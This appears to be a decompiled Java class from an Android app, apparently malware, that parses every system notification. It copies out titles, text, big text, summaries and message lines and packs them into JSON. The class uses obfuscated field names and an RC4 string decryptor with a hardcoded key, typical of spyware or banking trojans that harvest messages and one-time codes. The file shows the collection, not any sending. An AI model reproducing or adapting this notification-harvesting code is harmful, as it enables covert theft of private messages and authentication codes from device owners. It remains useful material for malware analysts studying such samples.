/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.annotation.TargetApi
 *  android.app.Notification
 *  android.os.Bundle
 *  android.service.notification.StatusBarNotification
 *  android.util.Base64
 *  org.json.JSONObject
 */
package com.example.mmm.Utils;

import android.annotation.TargetApi;
import android.app.Notification;
import android.os.Bundle;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;
import org.json.JSONObject;

final class NotificationParser {
    constants linked$ = new constants();
    utils keeping$ = new utils();
    private final boolean blowing$;
    private Notification reform$;
    private String seemed$;
    private String marathon$;
    private String reveals$;
    private String picking$;
    private String guest$;
    private String reuters$;
    private String casinos$;
    private String surgical$;
    private String permits$;
    private String mills$;

    @TargetApi(value=19)
    @TargetApi(value=19)
    NotificationParser(StatusBarNotification arrcharSequence, boolean bl) {
        this.blowing$ = bl;
        this.reform$ = arrcharSequence.getNotification();
        this.seemed$ = arrcharSequence.getPackageName();
        Object object = arrcharSequence.getNotification().extras;
        if (!bl) return;
        this.marathon$ = NotificationParser._alice(this.reform$.tickerText);
        if (object == null) return;
        arrcharSequence.getNotification();
        this.reveals$ = NotificationParser._alice(object.getCharSequence("android.title"));
        arrcharSequence.getNotification();
        this.picking$ = NotificationParser._alice(object.getCharSequence("android.title.big"));
        arrcharSequence.getNotification();
        this.guest$ = NotificationParser._alice(object.getCharSequence("android.text"));
        arrcharSequence.getNotification();
        this.reuters$ = NotificationParser._alice(object.getCharSequence("android.bigText"));
        arrcharSequence.getNotification();
        this.casinos$ = NotificationParser._alice(object.getCharSequence("android.infoText"));
        arrcharSequence.getNotification();
        this.surgical$ = NotificationParser._alice(object.getCharSequence("android.subText"));
        arrcharSequence.getNotification();
        this.permits$ = NotificationParser._alice(object.getCharSequence("android.summaryText"));
        arrcharSequence.getNotification();
        arrcharSequence = object.getCharSequenceArray("android.textLines");
        if (arrcharSequence == null) return;
        this.mills$ = "";
        int n2 = arrcharSequence.length;
        int n3 = 0;
        do {
            if (n3 >= n2) {
                this.mills$ = this.mills$.trim();
                return;
            }
            object = arrcharSequence[n3];
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append(this.mills$);
            stringBuilder.append(object);
            stringBuilder.append("\n");
            this.mills$ = stringBuilder.toString();
            ++n3;
        } while (true);
    }

    private static String _alice(CharSequence charSequence) {
        if (charSequence != null) return charSequence.toString();
        return "";
    }

    private String _knights(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    public final String toString() {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("packageName", (Object)this.seemed$);
        if (!this.blowing$) return "";
        jSONObject.put("tickerText", (Object)this.marathon$);
        jSONObject.put("title", (Object)this.reveals$);
        jSONObject.put("titleBig", (Object)this.picking$);
        jSONObject.put("text", (Object)this.guest$);
        jSONObject.put("textBig", (Object)this.reuters$);
        jSONObject.put("textInfo", (Object)this.casinos$);
        jSONObject.put("textSub", (Object)this.surgical$);
        jSONObject.put("textSummary", (Object)this.permits$);
        jSONObject.put("textLines", (Object)this.mills$);
        return jSONObject.toString();
    }
}

